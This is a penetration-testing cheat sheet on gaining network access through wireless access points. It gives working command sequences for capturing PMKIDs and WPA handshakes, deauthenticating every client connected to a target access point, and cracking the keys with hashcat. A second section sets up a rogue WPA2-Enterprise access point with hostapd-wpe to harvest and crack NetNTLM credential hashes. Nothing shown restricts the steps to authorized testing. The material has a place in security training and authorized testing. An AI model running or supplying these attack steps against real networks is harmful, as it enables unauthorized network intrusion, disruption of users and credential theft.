# __Network access via wireless access point__
>Author: Pieter Miske
---
### __Wireless based network attack methods:__
##### Capture PMKIDs or 3\-way handshakes from Wireless AP’s:
This technique can be used to capture handshakes between a client and a normal AP\. This requires that you either wait for a client to connect to the AP, or if a client has already connected, de\-authenticate the client from the AP and wait for them to re\-connect\.
>One of the following messages indicates a successful capture: \[FOUND HANDSHAKE AP\-LESS\] or \[FOUND AUTHORIZED HANDSHAKE\]\. 
- 1\. \(optional\) If using the Wifi Pineapple, login via ssh.
- 2\. Scan for nearby active AP’s \([hcxdumptool](https://github.com/ZerBea/hcxdumptool)\): `hcxdumptool -i wlan1 --do_rcascan`
- 3: Store target AP mac\-addresses in filter\.txt file: `echo <target mac address> > filter.txt`
- 4\. Perform the Client\-less PMKID Attack \(this will also automatically de\-authenticate all connected clients\) \([hcxdumptool](https://github.com/ZerBea/hcxdumptool)\):  `hcxdumptool -o test.pcapng -i wlan1 -c <AP channel> --filterlist_ap=filter.txt --filtermode=2 --enable_status=3`
- 5\. Converting and cracking wifi keys:
	- If captured \(normal\) WPA handshake:
		- 1\. Copy \.pcapng files to own machine
		- 2\. Convert \.pcapng to \.pcap file: `tshark -F pcap -r test.pcapng -w test.pcap`
		- 3\. Convert \.pcap to \.hccapx file \([hashcat\-utils](https://github.com/hashcat/hashcat-utils)\): `./cap2hccapx test.pcap test.hccapx`
		- 4\. Crack PSK hash: `hashcat -m 2500 -a 0 -w 3 test.hccapx </dir/wordlist>`
	- If captured EAPOL PMKID \(\[FOUND PMKID CLIENT\-LESS\] or \[FOUND PMKID\]\):
		- 1: Convert PMKID to readable hash format: `hcxpcaptool -z test.16800 test.pcapng`
		- 2\. Move the \.pcapng file to your machine
		- 3: Crack pmkid key: `hashcat -m 16800 -a 0 -w 3 pmkid_capture.16800 </dir/wordlist>`

##### _Capture NetNTLM hashes from WPA2 Enterprise WiFi AP:_
If protocols such as EAP\-MSCHAPv2 and EAP\-TTLS are used it may be possible to set up a malicious access point which accepts EAP authentication, and if the device or user enters their credentials they can be captured in the form of NetNTLM hashes\.
- 1\. Install HostAPDtool: `apt install hostapd-wpe python-jinja2`
- 2\. stop NetworkManager to prevent it interfering: `airmon-ng check kill`
- 3\. Setup the malicious AP via the configuration file: `nano /etc/hostapd-wpe/hostapd-wpe.conf`
- 4\. Start the malicious AP and wait until users connect: `hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf`
- 5\. Recover password from NetNTLM based hash: `hashcat -m 5500 <hash.txt> <wordlist.txt>`